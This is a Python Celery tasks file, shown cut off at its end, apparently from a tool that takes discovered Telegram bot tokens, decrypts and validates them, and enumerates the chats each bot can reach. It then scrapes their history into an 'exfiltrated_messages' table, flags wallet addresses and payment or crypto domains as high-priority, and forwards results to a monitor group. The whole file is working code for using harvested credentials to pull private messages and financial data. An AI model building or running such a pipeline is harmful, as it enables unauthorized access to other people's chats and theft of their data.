import asyncio
import os
import random
import time
from collections import defaultdict
from typing import Any, Dict, List

import httpx
from app.workers.celery_app import app
from app.core.database import db
from app.core.security import security
from app.services.scraper_srv import scraper_service
import redis
from app.core.config import settings
import logging
from celery.exceptions import SoftTimeLimitExceeded
from app.core.audit import AuditEvent, AuditLogger

logger = logging.getLogger("flow.tasks")

HIGH_PRIORITY_DOMAIN_KEYWORDS = (
    "wallet",
    "pay",
    "payment",
    "checkout",
    "exchange",
    "crypto",
    "blockchain",
)

# Helper for async DB execution
async def async_execute(query_builder):
    """Executes a Supabase query builder synchronously in a background thread."""
    return await asyncio.to_thread(query_builder.execute)


async def _send_alert(message: str) -> None:
    """Best-effort control-channel notification for high-priority telemetry."""
    try:
        await get_broadcaster().send_log(message)
    except Exception as e:
        logger.debug(f"[TelemetryParser] Alert dispatch skipped: {e}")


def _is_high_priority_indicator(indicator: Dict[str, Any]) -> bool:
    indicator_type = indicator.get("indicator_type")
    indicator_value = str(indicator.get("indicator_value") or "").lower()
    if indicator_type == "wallet_address":
        return True
    if indicator_type != "network_domain":
        return False
    return any(keyword in indicator_value for keyword in HIGH_PRIORITY_DOMAIN_KEYWORDS)


async def _hydrate_message_rows_for_index(message_rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Ensure rows have the exfiltrated_messages UUID needed by telemetry_indicators."""
    hydrated: List[Dict[str, Any]] = []
    missing_by_credential: Dict[str, List[int]] = defaultdict(list)
    source_by_key: Dict[tuple[str, int], Dict[str, Any]] = {}

    for row in message_rows:
        credential_id = row.get("credential_id")
        telegram_msg_id = row.get("telegram_msg_id")
        if row.get("id") and credential_id:
            hydrated.append(row)
            continue
        if credential_id and telegram_msg_id is not None:
            try:
                telegram_id_int = int(telegram_msg_id)
            except (TypeError, ValueError):
                continue
            key = (str(credential_id), telegram_id_int)
            source_by_key[key] = row
            missing_by_credential[str(credential_id)].append(telegram_id_int)

    for credential_id, telegram_ids in missing_by_credential.items():
        unique_ids = sorted(set(telegram_ids))
        for start in range(0, len(unique_ids), 100):
            chunk = unique_ids[start:start + 100]
            response = await async_execute(
                db.table("exfiltrated_messages")
                .select("id, credential_id, telegram_msg_id, content, media_type, file_meta")
                .eq("credential_id", credential_id)
                .in_("telegram_msg_id", chunk)
            )
            for db_row in response.data or []:
                try:
                    key = (str(db_row.get("credential_id")), int(db_row.get("telegram_msg_id")))
                except (TypeError, ValueError):
                    continue
                source_row = source_by_key.get(key, {})
                merged = dict(source_row)
                merged.update(db_row)
                hydrated.append(merged)

    return hydrated


async def _index_telemetry_indicators(message_rows: List[Dict[str, Any]]) -> int:
    """Best-effort structured indicator indexing for newly inserted messages."""
    if not message_rows:
        return 0

    try:
        from app.services.telemetry_parser import TelemetryEntityParser

        message_rows = await _hydrate_message_rows_for_index(message_rows)
        indicator_rows: List[Dict[str, Any]] = []
        for row in message_rows:
            message_id = row.get("id")
            credential_id = row.get("credential_id")
            if not message_id or not credential_id:
                continue

            raw_payload = row.get("raw_payload")
            if not isinstance(raw_payload, dict):
                raw_payload = row.get("file_meta") if isinstance(row.get("file_meta"), dict) else {}

            indicators = TelemetryEntityParser.parse_payload(row.get("content") or "", raw_payload)
            for indicator in indicators:
                indicator_rows.append({
                    "credential_id": credential_id,
                    "message_id": message_id,
                    "indicator_type": indicator["type"],
                    "indicator_value": indicator["value"],
                    "raw_context": {
                        "telegram_msg_id": row.get("telegram_msg_id"),
                        "media_type": row.get("media_type"),
                    },
                })

        if not indicator_rows:
            return 0

        result = await asyncio.wait_for(
            async_execute(
                db.table("telemetry_indicators").upsert(
                    indicator_rows,
                    on_conflict="message_id,indicator_type,indicator_value",
                    ignore_duplicates=True,
                )
            ),
            timeout=10.0,
        )
        inserted_rows = result.data or []
        high_priority_rows = [
            row for row in inserted_rows
            if _is_high_priority_indicator(row)
        ]
        if high_priority_rows:
            preview = ", ".join(
                str(row.get("indicator_value") or "")[:80]
                for row in high_priority_rows[:5]
            )
            await _send_alert(
                "**Telemetry Entity Indexed**\n"
                f"New financial or high-priority infrastructure strings: `{preview}`"
            )
        return len(inserted_rows)
    except Exception as e:
        logger.debug(f"[TelemetryParser] Indicator indexing skipped: {e}")
        return 0


async def _merge_credential_meta(cred_id: str, patch: Dict[str, Any]) -> Dict[str, Any]:
    """Merge a metadata patch without overwriting unrelated enrichment keys."""
    fresh_meta_res = await async_execute(
        db.table("discovered_credentials").select("meta").eq("id", cred_id).single()
    )
    existing_meta = {}
    if isinstance(fresh_meta_res.data, dict):
        existing_meta = fresh_meta_res.data.get("meta") or {}
    merged_meta = dict(existing_meta)
    merged_meta.update(patch)
    await async_execute(
        db.table("discovered_credentials").update({"meta": merged_meta}).eq("id", cred_id)
    )
    return merged_meta


async def _fetch_bot_capabilities(
    bot_token: str,
    chat_id: int | None = None,
    get_me_result: dict | None = None,
) -> dict:
    """
    Fetch bot capability metadata from the Telegram Bot API.
    Returns dict with keys: can_join_groups, can_read_all_group_messages,
    supports_inline_queries, default_admin_rights_groups,
    default_admin_rights_channels, description, short_description, linked_chat_id.
    Never raises — returns {} on total failure, partial dict on partial failure.
    """
    capabilities: dict = {}
    base = f"https://api.telegram.org/bot{bot_token}"

    async def _get(path: str) -> dict | None:
        try:
            async with httpx.AsyncClient(timeout=10.0) as _hc:
                r = await _hc.get(f"{base}/{path}")
                if r.status_code == 200:
                    return r.json().get("result") or {}
        except Exception as e:
            logger.debug(f"[BotCapabilities] {path} failed: {e}")
        return None

    # Reuse existing getMe result if provided, else fetch fresh
    me = get_me_result or await _get("getMe")
    if me:
        capabilities["can_join_groups"] = bool(me.get("can_join_groups"))
        capabilities["can_read_all_group_messages"] = bool(me.get("can_read_all_group_messages"))
        capabilities["supports_inline_queries"] = bool(me.get("supports_inline_queries"))

    # Default admin rights for groups
    groups_rights = await _get("getMyDefaultAdministratorRights?for_channels=false")
    capabilities["default_admin_rights_groups"] = groups_rights if groups_rights else None

    # Default admin rights for channels
    channel_rights = await _get("getMyDefaultAdministratorRights?for_channels=true")
    capabilities["default_admin_rights_channels"] = channel_rights if channel_rights else None

    # Bot description
    desc = await _get("getMyDescription")
    capabilities["description"] = (desc or {}).get("description", "")

    short_desc = await _get("getMyShortDescription")
    capabilities["short_description"] = (short_desc or {}).get("short_description", "")

    # Linked chat from primary chat if available
    capabilities["linked_chat_id"] = None
    if chat_id:
        chat_info = await _get(f"getChat?chat_id={chat_id}")
        if chat_info:
            capabilities["linked_chat_id"] = chat_info.get("linked_chat_id")

    return capabilities

def _strategy_attempt_to_dict(attempt: Any) -> Dict[str, Any]:
    if hasattr(attempt, "to_dict"):
        return attempt.to_dict()
    if isinstance(attempt, dict):
        return dict(attempt)
    return {
        "name": getattr(attempt, "name", "unknown"),
        "success": getattr(attempt, "success", False),
        "message_count": getattr(attempt, "message_count", 0),
        "reason": str(getattr(attempt, "reason", "")),
        "retryable": getattr(attempt, "retryable", False),
        "evidence": getattr(attempt, "evidence", {}),
    }


async def _persist_scrape_classification(cred_id: str, scrape_result: Any) -> None:
    from datetime import datetime, timezone

    if hasattr(scrape_result, "to_metadata"):
        meta_patch = scrape_result.to_metadata()
    else:
        meta_patch = {
            "last_scrape_reason": "success" if scrape_result else "no_new_messages",
            "last_scrape_retryable": False,
            "last_scrape_evidence": {"legacy_result": True},
            "last_scrape_strategy_attempts": [],
            "last_scrape_next_action": "persist_messages" if scrape_result else "no_action",
        }

    meta_patch["last_scrape_at"] = datetime.now(timezone.utc).isoformat()
    await _merge_credential_meta(cred_id, meta_patch)

    reason = meta_patch.get("last_scrape_reason")
    attempts = meta_patch.get("last_scrape_strategy_attempts") or []
    AuditLogger.log(
        AuditEvent.SCRAPE_CLASSIFIED,
        credential_id=cred_id,
        details={
            "reason": reason,
            "retryable": meta_patch.get("last_scrape_retryable"),
            "next_action": meta_patch.get("last_scrape_next_action"),
            "message_count": len(getattr(scrape_result, "messages", scrape_result or [])),
            "strategy_count": len(attempts),
        },
        success=reason in ("success", "no_new_messages"),
    )
    for attempt in attempts:
        attempt_data = _strategy_attempt_to_dict(attempt)
        AuditLogger.log(
            AuditEvent.SCRAPE_STRATEGY_ATTEMPT,
            credential_id=cred_id,
            details=attempt_data,
            success=bool(attempt_data.get("success")),
        )


def _broadcast_retry_delay_seconds(reason: str, retryable: bool, retry_after_seconds: int | None) -> int:
    if retry_after_seconds:
        base_delay = max(60, int(retry_after_seconds) + 30)
    elif not retryable:
        base_delay = 24 * 3600
    elif reason == "timeout":
        base_delay = 5 * 60
    elif reason == "network_disconnect":
        base_delay = 10 * 60
    elif reason == "topic_missing":
        base_delay = 60
    elif reason == "flood_wait":
        base_delay = 30 * 60
    else:
        base_delay = 15 * 60

    max_delay = max(60, int(os.getenv("BROADCAST_RETRY_MAX_DELAY_SECONDS", str(24 * 3600))))
    delay = min(base_delay, max_delay)
    if not retryable:
        return delay

    jitter_ratio = max(0.0, min(float(os.getenv("BROADCAST_RETRY_JITTER_RATIO", "0.20")), 0.50))
    jitter = int(delay * jitter_ratio)
    if jitter <= 0:
        return delay
    return max(60, delay + random.randint(-jitter, jitter))


_BROADCAST_RELIABILITY_COLUMNS_AVAILABLE: bool | None = None
_BROADCAST_RELIABILITY_LAST_CHECK = 0.0


def _is_missing_broadcast_reliability_column(exc: BaseException) -> bool:
    text = str(exc).lower()
    return (
        any(
            column in text
            for column in ("broadcast_error", "broadcast_attempts", "next_retry_at")
        )
        and (
            "column" in text
            or "schema cache" in text
            or "does not exist" in text
            or "42703" in text
            or "pgrst204" in text
        )
    )


def _can_use_broadcast_reliability_columns() -> bool:
    if _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE is not False:
        return True
    return time.time() - _BROADCAST_RELIABILITY_LAST_CHECK > 300


def _set_broadcast_reliability_columns_available(value: bool) -> None:
    global _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE
    global _BROADCAST_RELIABILITY_LAST_CHECK
    _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE = value
    _BROADCAST_RELIABILITY_LAST_CHECK = time.time()


async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> List[Dict[str, Any]]:
    base_query = (
        db.table("exfiltrated_messages")
        .select("*, discovered_credentials!inner(meta)")
        .eq("is_broadcasted", False)
    )

    if _can_use_broadcast_reliability_columns():
        try:
            response = await async_execute(
                base_query
                .or_(f"next_retry_at.is.null,next_retry_at.lte.{now_iso}")
                .order("telegram_msg_id", desc=False)
                .limit(batch_size)
            )
            _set_broadcast_reliability_columns_available(True)
            return response.data or []
        except Exception as exc:
            if not _is_missing_broadcast_reliability_column(exc):
                raise
            _set_broadcast_reliability_columns_available(False)
            logger.warning(
                "[Broadcast] Reliability columns missing; using legacy pending query. "
                "Apply database/migrations/2026-08-02-scrape-broadcast-reliability.sql "
                "to enable retry scheduling."
            )

    response = await async_execute(
        db.table("exfiltrated_messages")
        .select("*, discovered_credentials!inner(meta)")
        .eq("is_broadcasted", False)
        .order("telegram_msg_id", desc=False)
        .limit(batch_size)
    )
    return response.data or []


async def _update_message_broadcast_success(msg_id: str) -> None:
    from datetime import datetime, timezone

    now_iso = datetime.now(timezone.utc).isoformat()
    payload = {
        "is_broadcasted": True,
        "broadcast_claimed_at": None,
        "broadcasted_at": now_iso,
    }
    if _can_use_broadcast_reliability_columns():
        try:
            await async_execute(
                db.table("exfiltrated_messages")
                .update({
                    **payload,
                    "broadcast_error": None,
                    "next_retry_at": None,
                })
                .eq("id", msg_id)
            )
            _set_broadcast_reliability_columns_available(True)
            return
        except Exception as exc:
            if _is_missing_broadcast_reliability_column(exc):
                _set_broadcast_reliability_columns_available(False)
                logger.warning(
                    "[Broadcast] Reliability columns missing on success update; "
                    "falling back to legacy broadcast status update."
                )
            elif "broadcasted_at" in str(exc):
                # Column not yet migrated — retry without it
                logger.warning(
                    "[Broadcast] broadcasted_at column missing; apply migration "
                    "supabase/migrations/20260803000001_broadcasted_at.sql. "
                    "Falling back to legacy update."
                )
                payload.pop("broadcasted_at", None)
                await async_execute(
                    db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
                )
                return
            else:
                raise

    # Legacy path — column-existence unknown, try WITH broadcasted_at first
    try:
        await async_execute(
            db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
        )
    except Exception as exc:
        if "broadcasted_at" in str(exc):
            payload.pop("broadcasted_at", None)
            await async_execute(
                db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
            )
        else:
            raise


async def _mark_broadcast_failure(msg: Dict[str, Any], exc: BaseException) -> None:
    from datetime import datetime, timedelta, timezone

    msg_id = msg["id"]
    reason = getattr(exc, "reason", exc.__class__.__name__)
    retryable = bool(getattr(exc, "retryable", True))
    detail = getattr(exc, "detail", str(exc)) or reason
    retry_after_seconds = getattr(exc, "retry_after_seconds", None)
    now = datetime.now(timezone.utc)
    attempts = int(msg.get("broadcast_attempts") or 0) + 1
    delay_seconds = _broadcast_retry_delay_seconds(reason, retryable, retry_after_seconds)
    next_retry_at = (now + timedelta(seconds=delay_seconds)).isoformat()
    payload = {
        "broadcast_claimed_at": None,
        "broadcast_error": {
            "reason": reason,
            "detail": str(detail)[:500],
            "retryable": retryable,
            "failed_at": now.isoformat(),
        },
        "broadcast_attempts": attempts,
        "next_retry_at": next_retry_at,
    }
    try:
        await async_execute(db.table("exfiltrated_messages").update(payload).eq("id", msg_id))
        _set_broadcast_reliability_columns_available(True)
    except Exception as update_exc:
        if not _is_missing_broadcast_reliability_column(update_exc):
            raise
        _set_broadcast_reliability_columns_available(False)
        logger.warning(
            "[Broadcast] Reliability columns missing on failure update; clearing claim only. "
            "Apply database/migrations/2026-08-02-scrape-broadcast-reliability.sql "
            "to persist broadcast errors and retry times."
        )
        await async_execute(
            db.table("exfiltrated_messages")
            .update({"broadcast_claimed_at": None})
            .eq("id", msg_id)
        )
    AuditLogger.log(
        AuditEvent.BROADCAST_FAILED,
        credential_id=msg.get("credential_id"),
        details={
            "message_id": msg_id,
            "reason": reason,
            "retryable": retryable,
            "attempts": attempts,
            "next_retry_at": next_retry_at,
        },
        success=False,
    )


# Redis Client for Locking
redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)


# ==============================================
# BROADCASTER SINGLETON (BUG-011)
# Module-level instance so bot rotation state (itertools.cycle)
# persists across task invocations within the same worker process.
# ==============================================
_broadcaster = None


def get_broadcaster():
    """
    Returns the module-level BroadcasterService singleton.
    Lazy-initialized to avoid import-time issues.
    Bot rotation state is preserved across all task calls in this worker.
    """
    global _broadcaster
    if _broadcaster is None:
        from app.services.broadcaster_srv import BroadcasterService
        _broadcaster = BroadcasterService()
    return _broadcaster


def _queue_revoked_topic_close(cred_id: str, reason: str) -> None:
    if not getattr(settings, "AUTO_CLOSE_REVOKED_TOPICS", True):
        return
    try:
        close_revoked_topics.apply_async(
            kwargs={
                "limit": 1,
                "dry_run": False,
                "credential_id": cred_id,
                "reason": reason,
            },
            countdown=5,
            queue="celery",
        )
    except Exception as exc:
        logger.warning(f"[TopicClose] Could not queue revoked-topic close for {cred_id}: {exc}")


async def _mark_credential_revoked(cred_id: str, reason: str) -> None:
    await async_execute(
        db.table("discovered_credentials")
        .update({"status": "revoked"})
        .eq("id", cred_id)
    )
    _queue_revoked_topic_close(cred_id, reason)

@app.task(name="flow.exfiltrate_chat", soft_time_limit=2400, time_limit=2500)
def exfiltrate_chat(cred_id: str):
    """
    1. Decrypt token.
    2. Scrape history.
    3. Save to DB.
    4. Trigger broadcast.
    """
    try:
        from app.workers.celery_app import get_worker_loop
        return get_worker_loop().run_until_complete(_exfiltrate_logic(cred_id))
    except SoftTimeLimitExceeded:
        logger.warning(f"⏰ [Exfil] Soft time limit exceeded for {cred_id}. Saving partial results.")
        return f"Exfiltration timed out for {cred_id} (partial results may have been saved)."

async def _exfiltrate_logic(cred_id: str):
    logger.info(f"🕵️ [Exfil] Starting process for CredID: {cred_id}")

    broadcaster = get_broadcaster()
    await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")

    # T010: Observability hook
    from app.core.metrics import metrics
    from app.core.audit import AuditLogger
    metrics.inc("exfiltrate.started")
    AuditLogger.log(
        event_type="exfiltrate.start",
        credential_id=cred_id,
        details={"cred_id": cred_id}
    )
    
    # Fetch credential
    response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id, meta").eq("id", cred_id))
    if not response.data:
        logger.error(f"❌ [Exfil] Credential {cred_id} not found in DB.")
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    encrypted_token = record["bot_token"]
    chat_id = record["chat_id"]

    logger.info(f"    [Exfil] Found Chat ID: {chat_id}")

    # Guard: never exfiltrate the monitor hub — circular scrape protection.
    # Use the async resolver so the first call (cold cache) doesn't block the event loop
    # via a synchronous httpx.get() inside an async task.
    from app.services.scraper_srv import _resolve_monitor_group_ids_async
    if chat_id:
        monitor_ids = await _resolve_monitor_group_ids_async()
        if str(chat_id) in monitor_ids or chat_id in monitor_ids:
            logger.warning(f"⛔ [Exfil] Skipping cred {cred_id} — chat_id {chat_id} is the monitor hub.")
            await async_execute(
                db.table("discovered_credentials")
                .update({"chat_id": None})
                .eq("id", cred_id)
            )
            return f"Skipped: chat_id {chat_id} is monitor hub — cleared."


    try:
        if not encrypted_token.startswith("gAAAA"):
            # Likely raw token from "bugged" scanner run
            bot_token = encrypted_token
            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
            try:
                new_enc = security.encrypt(bot_token)
                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                logger.info(f"    🩹 [Exfil] Self-healed unencrypted token for {cred_id}")
            except Exception as heal_err:
                logger.warning(f"    ⚠️ [Exfil] Self-heal encrypt failed for {cred_id}: {heal_err}")
        else:
            bot_token = security.decrypt(encrypted_token).strip()
    except Exception as e:
        # Invalid token or key mismatch
        logger.error(f"❌ [Exfil] Decryption failed for {cred_id}: {e}")
        await _mark_credential_revoked(cred_id, "exfil_decryption_failed")
        return f"Decryption failed for {cred_id}: {e}"

    # Validate decrypted token format before use
    from app.utils.helpers import is_valid_telegram_token
    if not is_valid_telegram_token(bot_token):
        logger.error(f"❌ [Exfil] Decrypted token has invalid format for {cred_id}. Marking revoked.")
        await _mark_credential_revoked(cred_id, "exfil_invalid_token_format")
        return f"Invalid token format after decryption for {cred_id}"

    # HTTP Preflight Check — verify token before heavy scrape
    try:
        await scraper_service._probe_gateway_telemetry(encrypted_token, cred_id)
        updates, meta_info, is_revoked = await scraper_service._http_preflight_check(bot_token)
        if is_revoked:
            await _mark_credential_revoked(cred_id, "exfil_preflight_revoked")
            return "Record inactive; marked revoked during preflight."
        if meta_info:
            await _merge_credential_meta(cred_id, meta_info)
        if updates:
            for u in updates:
                u["credential_id"] = cred_id
            preflight_result = await async_execute(
                db.table("exfiltrated_messages").upsert(
                    updates,
                    on_conflict="credential_id,telegram_msg_id",
                    ignore_duplicates=True
                )
            )
            await _index_telemetry_indicators(preflight_result.data or updates)
    except Exception as e:
        logger.warning(f"⚠️ [Exfil] Preflight check failed for {cred_id}: {e}")

    # Scrape
    try:
        logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
        await broadcaster.send_log(f"⏳ Scraping chat `{chat_id}`...")
        
        scrape_result = await scraper_service.scrape_history(bot_token, chat_id)
        await _persist_scrape_classification(cred_id, scrape_result)
        messages = list(getattr(scrape_result, "messages", scrape_result))
        
        logger.info(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
        reason = getattr(scrape_result, "reason_code", "success" if messages else "no_new_messages")
        await broadcaster.send_log(f"✅ Scraped {len(messages)} messages (`{reason}`).")
    except SoftTimeLimitExceeded:
        logger.warning(f"⏰ [Exfil] Scraping timed out for chat {chat_id}. Continuing with 0 messages.")
        from app.services._scraper.results import ScrapeReason, ScrapeResult

        await _persist_scrape_classification(
            cred_id,
            ScrapeResult(
                messages=[],
                reason=ScrapeReason.TIMEOUT,
                retryable=True,
                evidence={"exception": "SoftTimeLimitExceeded", "chat_id": chat_id},
                strategy_attempts=[],
            ),
        )
        messages = []
    except Exception as e:
        err_str = str(e)
        from app.services._scraper.results import ScrapeResultClassifier

        classified = ScrapeResultClassifier().result_from_attempts(
            [],
            [ScrapeResultClassifier().classify_exception(e, strategy="scrape_history")],
            evidence={"chat_id": chat_id},
        )
        await _persist_scrape_classification(cred_id, classified)
        # Only mark revoked for definitive Telegram rejection — NOT transient errors.
        # Transient: network failures, timeouts, flood waits, server errors.
        # Permanent: bot kicked/banned, token invalid (401), account deactivated.
        permanent_errors = (
            "AuthKeyUnregisteredError" in err_str
            or "UserDeactivatedBanError" in err_str
            or ("401" in err_str and "Unauthorized" in err_str)  # explicit parens — AND binds tighter than OR
        )
        if permanent_errors:
            logger.error(f"❌ [Exfil] Permanent scraper failure for {cred_id}: {e}. Marking revoked.")
            await _mark_credential_revoked(cred_id, "exfil_permanent_scraper_failure")
        else:
            logger.warning(f"⚠️ [Exfil] Transient scraper failure for {cred_id}: {e}. Leaving status for retry.")
        return f"Scraping failed: {e}"

    # Save Messages (using UPSERT to prevent duplicates)
    new_count = 0
    index_candidates: List[Dict[str, Any]] = []
    for msg in messages:
        msg["credential_id"] = cred_id
        
        # SANITIZE: Remove keys that don't exist in the 'exfiltrated_messages' table
        # ScraperService adds 'chat_id' for context, but DB doesn't have it.
        db_payload = msg.copy()
        if "chat_id" in db_payload:
            del db_payload["chat_id"]
            
        try:
            # Use upsert: insert if not exists, ignore if duplicate
            result = await async_execute(db.table("exfiltrated_messages").upsert(
                db_payload,
                on_conflict="credential_id,telegram_msg_id",  # Conflict columns
                ignore_duplicates=True  # Don't update existing, just skip
            ))
            
            if result.data:
                new_count += 1
                index_candidates.extend(result.data)
            else:
                index_candidates.append(db_payload)
        except Exception as e:
            logger.error(f"    ❌ Insert error for msg {msg.get('telegram_msg_id')}: {e}")

    if index_candidates:
        await _index_telemetry_indicators(index_candidates)

    if new_count > 0:
        await broadcaster.send_log(f"💾 Saved {new_count} new messages to DB.")

    # Trigger Broadcast
    if new_count > 0:
        broadcast_pending.delay()

    return f"Exfiltrated {new_count} new messages."

@app.task(name="flow.enrich_credential")
def enrich_credential(cred_id: str):
    """
    1. Decrypt token.
    2. Discover chats (Enrichment).
    3. Update DB with Chat ID(s).
    4. Trigger Exfiltration.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_enrich_logic(cred_id))

async def _enrich_logic(cred_id: str):
    logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")

    # T010: Observability hook
    from app.core.metrics import metrics
    from app.core.audit import AuditLogger
    metrics.inc("enrich.started")
    AuditLogger.log(
        event_type="enrich.start",
        credential_id=cred_id,
        details={"cred_id": cred_id}
    )

    broadcaster = get_broadcaster()
    await broadcaster.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
    # Fetch credential
    response = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id))
    if not response.data:
        logger.error(f"❌ [Enrich] Credential {cred_id} not found.")
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    
    # Decrypt or Handle Legacy/Raw
    try:
        if not record["bot_token"].startswith("gAAAA"):
             # Likely raw token
            bot_token = record["bot_token"]
            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
            try:
                new_enc = security.encrypt(bot_token)
                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                logger.info(f"    🩹 [Enrich] Self-healed unencrypted token for {cred_id}")
            except Exception as heal_err:
                logger.warning(f"    ⚠️ [Enrich] Self-heal encrypt failed for {cred_id}: {heal_err}")
        else:
            bot_token = security.decrypt(record["bot_token"]).strip()
    except Exception as e:
        logger.error(f"❌ [Enrich] Decryption failed: {e}")
        await _mark_credential_revoked(cred_id, "enrich_decryption_failed")
        return f"Decryption failed: {e}"

    # Validate decrypted token format before use
    from app.utils.helpers import is_valid_telegram_token
    if not is_valid_telegram_token(bot_token):
        logger.error(f"❌ [Enrich] Decrypted token has invalid format for {cred_id}. Marking revoked.")
        await _mark_credential_revoked(cred_id, "enrich_invalid_token_format")
        return f"Invalid token format after decryption for {cred_id}"

    # Discover
    bot_info = {}
    try:
        logger.info("🔎 [Enrich] Discovering chats via ScraperService...")
        bot_info, chats = await scraper_service.discover_chats(bot_token)
        logger.info(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
        if chats:
            chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
            logger.info(f"    [Enrich] Chats found: {chat_list}")
            await broadcaster.send_log(f"✅ Discovered chats: {chat_list}")
        else:
            logger.info("    [Enrich] No chats found.")
            await broadcaster.send_log("⚠️ No chats found.")
    except Exception as e:
        logger.error(f"❌ [Enrich] Discovery failed: {e}")
        return f"Discovery failed: {e}"

    # Filter out synthetic "bot_self" entries — these are placeholders, not real chats.
    # discover_chats() inserts them when the token is valid but has no recent activity;
    # using the bot's own Telegram ID as a chat_id causes failed exfiltration.
    real_chats = [c for c in chats if c.get("type") != "bot_self"]

    if not real_chats:
        # Valid token, but no open dialogs (or only bot_self placeholder).
        logger.info("    [Enrich] No real chats via API. Skipping Orphan Match (Disabled).")
        # Mark as 'active' - token works but truly no chats accessible
        await async_execute(db.table("discovered_credentials").update({"status": "active"}).eq("id", cred_id))
        return "Token valid, but no real chats found. Status updated to 'active'."

    chats = real_chats

    # Update Logic
    # 1. Update the ORIGINAL record with the first chat found.
    # 2. If more chats, create NEW records (clones).

    first_chat = chats[0]
    logger.info(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
    
    # Update primary
    # Pre-create Topic with NEW FORMAT: @username / botid
    from app.core.config import settings
    
    bot_username = bot_info.get("username") or ""
    bot_id = bot_info.get("id") or ""

    # Fallback: if discover_chats didn't return bot info, try a direct getMe()
    if not bot_username or not bot_id:
        try:
            async with httpx.AsyncClient(timeout=10.0) as _hc:
                gm = await _hc.get(f"https://api.telegram.org/bot{bot_token}/getMe")
                if gm.status_code == 200:
                    gm_data = gm.json().get("result", {})
                    bot_username = bot_username or gm_data.get("username", "")
                    bot_id = bot_id or gm_data.get("id", "")
        except Exception:
            pass

    bot_username = bot_username or "unknown"
    bot_id = bot_id or "0"
    capabilities = await _fetch_bot_capabilities(
        bot_token,
        chat_id=first_chat["id"] if real_chats else None,
    )
    topic_name = f"@{bot_username} / {bot_id}"
    
    topic_id = 0
    try:
        topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
        # Header handled by ensure_topic automatically
    except Exception as e:
        logger.warning(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")

    # Always re-fetch meta immediately before writing to minimise the race window
    # (another worker may have enriched or set topic_id between our earlier fetch and now)
    cur = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
    meta_payload = dict((cur.data or {}).get("meta") or {})
    meta_payload.update({
        "chat_name": first_chat["name"],
        "type": first_chat["type"],
        "enriched": True,
        "bot_username": bot_username,
        "bot_id": bot_id,
    })
    if topic_id:
        meta_payload["topic_id"] = topic_id
    meta_payload["capabilities"] = capabilities

    await async_execute(db.table("discovered_credentials").update({
        "chat_id": first_chat["id"],
        "meta": meta_payload,
    }).eq("id", cred_id))

    # Fire webhook alert (fire-and-forget — never blocks enrich)
    try:
        from app.core.webhook import dispatch_alert as _dispatch_alert
        from datetime import datetime, timezone as _tz
        await _dispatch_alert({
            "event": "credential_activated",
            "timestamp": datetime.now(_tz.utc).isoformat(),
            "credential_id": cred_id,
            "bot_username": bot_username,
            "bot_id": str(bot_id),
            "chat_id": first_chat["id"],
            "chat_name": first_chat["name"],
            "capabilities": meta_payload.get("capabilities", {}),
        })
    except Exception as _wh_exc:
        logger.debug(f"[Webhook] dispatch_alert failed: {_wh_exc}")
    
    # Trigger Exfiltration for Primary
    logger.info(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
    await broadcaster.send_log("🚀 Triggering background exfiltration task.")
    exfiltrate_chat.delay(cred_id)

    msg = f"Enriched {cred_id} with chat {first_chat['id']}."

    # --- Multi-chat: create sibling credential records for every additional chat ---
    if len(chats) > 1:
        import hashlib as _hashlib
        cloned = 0
        for extra_chat in chats[1:]:
            extra_chat_id = extra_chat["id"]
            # Synthetic hash: unique per (token, chat) pair so the UNIQUE constraint holds
            extra_hash = _hashlib.sha256(
                f"{bot_token}|chat:{extra_chat_id}".encode()
            ).hexdigest()

            try:
                existing = await async_execute(
                    db.table("discovered_credentials").select("id").eq("token_hash", extra_hash)
                )
                if existing.data:
                    continue  # already exists from a previous enrich run

                sibling_data = {
                    "bot_token": security.encrypt(bot_token),
                    "token_hash": extra_hash,
                    "chat_id": extra_chat_id,
                    "chat_name": extra_chat.get("name"),
                    "chat_type": extra_chat.get("type"),
                    "bot_id": str(bot_id),
                    "bot_username": bot_username,
                    "source": "multi_chat",
                    "status": "active",
                    "meta": {
                        "bot_username": bot_username,
                        "bot_id": bot_id,
                        "topic_id": topic_id,  # share same monitor topic thread
                        "parent_credential_id": cred_id,
                        "enriched": True,
                    },
                }
                res = await async_execute(db.table("discovered_credentials").insert(sibling_data))
                if res.data:
                    sibling_id = res.data[0]["id"]
                    exfiltrate_chat.delay(sibling_id)
                    cloned += 1
                    logger.info(
                        f"    ➕ [Enrich] Created sibling credential {sibling_id} for chat {extra_chat_id}"
                    )
            except Exception as e:
                logger.error(f"    ❌ [Enrich] Failed to clone for chat {extra_chat_id}: {e}")

        if cloned:
            msg += f" (+{cloned} sibling chats queued)"
            await broadcaster.send_log(f"➕ Queued {cloned} additional chat(s) for exfiltration.")

    return msg

@app.task(name="flow.broadcast_pending")
def broadcast_pending():
    if not settings.ENABLE_RAW_MESSAGE_BROADCAST:
